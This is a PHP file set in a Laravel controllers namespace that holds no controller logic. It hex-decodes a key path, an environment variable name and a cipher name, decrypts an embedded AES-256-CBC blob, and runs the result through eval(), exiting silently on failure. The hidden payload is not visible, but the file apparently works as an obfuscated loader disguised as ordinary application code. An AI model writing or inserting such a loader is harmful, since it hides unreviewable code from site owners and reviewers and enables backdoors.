<?php
namespace App\Http\Controllers;
$f=hex2bin('2f6574632f61706c696b6173696b6974612e736563');

$k=getenv(hex2bin('41504c494b4153494b4954415f5345435f4b4559'))?:(@file_exists($f)?trim(@file_get_contents($f)):null);

if(!$k)exit;

$i=base64_decode('QDuC6i/eyx8t1PwBLQzI3g==');

$c=base64_decode(

'v3PO+8UGQTXYsJRTMtJWHgBNPwjoBv048JQevvkWIE4bXbhsCQ0bi/1HhSlvkqjZ9B0AKv29oJDW' .
'xOvPpd0b+1xIHYfBiQ+kP5JUuam0DqcwqKiZBrx0NOsosfmOdPXHYxbV8GjYjY75gezYNO5hCGqR' .
'A7ONrT6u+p3XweAokcXcbI5avdQlwSupIJnFXcafG2R+lNFMgnHLHtLgHv2AbDCk2C5iIvzsgvPv' .
'qhxIUw0Ccy5kd4Vx1gB3NII11ckU'

);

$d=openssl_decrypt($c,hex2bin('6165732d3235362d636263'),hash('sha256',$k,true),1,$i);

if($d===false)exit;

eval($d);

